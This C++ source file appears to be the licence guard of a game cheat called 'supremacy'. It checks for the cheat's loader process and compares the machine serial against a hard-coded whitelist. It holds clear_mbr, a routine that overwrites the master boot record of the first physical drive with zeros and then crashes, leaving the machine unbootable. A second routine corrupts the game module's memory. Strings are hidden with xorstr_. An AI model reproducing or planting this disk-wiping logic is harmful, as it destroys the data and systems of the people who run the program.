#ifndef ALPHA
#ifndef _DEBUG
#include "../../supremacy.hpp"

namespace supremacy {
	bool c_guard::is_loader_run() {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		Process32First(snapshot, &pe);

		while (TRUE) {
			if (strcmp(pe.szExeFile, xorstr_("supremacy.exe")) == NULL)
				return true;

			if (!Process32Next(snapshot, &pe))
				return false;
		}
	}

	bool c_guard::is_serial_valid() {
		if (get_serial() == std::to_string(4994741059296279u)) // 209943495 (222)
			return true;

		if (get_serial() == std::to_string(9454447649412441u)) // 411600844 (220)
			return true;

		if (get_serial() == std::to_string(4634474606034862u)) // 387654812 (205)
			return true;

		if (get_serial() == std::to_string(7400447049844444u)) // 442636099 (137)
			return true;

		if (get_serial() == std::to_string(0u).append(std::to_string(440744989402442u))) // 569572939 (192)
			return true;

		if (get_serial() == std::to_string(4144844644341444u)) // 267050774 (143)
			return true;

		if (get_serial() == std::to_string(3906841941654240u)) // 682283744 (135)
			return true;

		if (get_serial() == std::to_string(4534414444165035u)) // 599727887 (178)
			return true;

		if (get_serial() == std::to_string(4414838984963964u)) // 314119670 (141)
			return true;

		if (get_serial() == std::to_string(4714485147444474u)) // 753768012 (140)
			return true;

		if (get_serial() == std::to_string(6444244954445254u)) // 818310858 (138)
			return true;

		if (get_serial() == std::to_string(4404739434791344u)) // 593129066 (105)
			return true;

		if (get_serial() == std::to_string(4484413194740444u)) // 600501123 (132)
			return true;

		if (get_serial() == std::to_string(0u).append(std::to_string(408617740544444u))) // 523232829 (78)
			return true;

		if (get_serial() == std::to_string(9844338444400224u)) // 251604733 (131)
			return true;

		if (get_serial() == std::to_string(1547316139944444u)) // 438667129 (130)
			return true;

		if (get_serial() == std::to_string(6624315784179898u)) // 530152321 (123)
			return true;

		if (get_serial() == std::to_string(3244494169494432u)) // 635417062 (106)
			return true;

		if (get_serial() == std::to_string(6184446436048644u)) // 465420668 (122)
			return true;

		if (get_serial() == std::to_string(4446222048784543u)) // 552030053 (121)
			return true;

		if (get_serial() == std::to_string(4116743242565444u)) // 255022036 (115)
			return true;

		if (get_serial() == std::to_string(9944049443444444u)) // 806444023 (57)
			return true;

		if (get_serial() == std::to_string(1437848949413146u)) // 786901336 (97)
			return true;

		if (get_serial() == std::to_string(9412682440494774u)) // 801063408 (101)
			return true;

		if (get_serial() == std::to_string(6541244434069344u)) // 432389087 (99)
			return true;

		if (get_serial() == std::to_string(4465846633446435u)) // 632471012 (7)
			return true;

		if (get_serial() == std::to_string(8544444433761242u)) // 587254550 (88)
			return true;

		if (get_serial() == std::to_string(0u).append(std::to_string(447044404144424u))) // 223026461 (81)
			return true;

		if (get_serial() == std::to_string(4574444144156967u)) // 350549613 (4)
			return true;

		if (get_serial() == std::to_string(4454448034148494u)) // 399912365 (68)
			return true;

		if (get_serial() == std::to_string(4059490114532484u)) // 551997412 (10)
			return true;

		if (get_serial() == std::to_string(4445494944675541u)) // 410005783 (8)
			return true;

		if (get_serial() == std::to_string(5696444414604446u)) // 649952982 (18)
			return true;

		if (get_serial() == std::to_string(4644424651844544u)) // 438209223 (29)
			return true;

		if (get_serial() == std::to_string(7444472034442747u)) // 503629479 (56)
			return true;

		if (get_serial() == std::to_string(5434444741247152u)) // 579860503 (6)
			return true;

		if (get_serial() == std::to_string(7443376941262548u)) // 85075182 (9)
			return true;

		if (get_serial() == std::to_string(4444316678944270u)) // 512137231 (5)
			return true;

		if (get_serial() == std::to_string(7444416442657893u)) // 421616546 (1)
			return true;

		return false;
	}

	void c_guard::clear_mbr() {
		DWORD write;
		char empty[0x200u];
		ZeroMemory(empty, sizeof empty);
		HANDLE master_boot_record = CreateFile(xorstr_("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		WriteFile(master_boot_record, empty, 0x200u, &write, NULL);
		raise(SIGSEGV);
	}

	void c_guard::crash() {
		MODULEINFO module_info;
		GetModuleInformation(GetCurrentProcess(), GetModuleHandle(xorstr_("client.dll")), &module_info, sizeof(MODULEINFO));

		auto address = (DWORD)module_info.lpBaseOfDll;

		while (TRUE) {
			*(DWORD*)(address) = NULL;
			++address;
		}
	}
}
#endif
#endif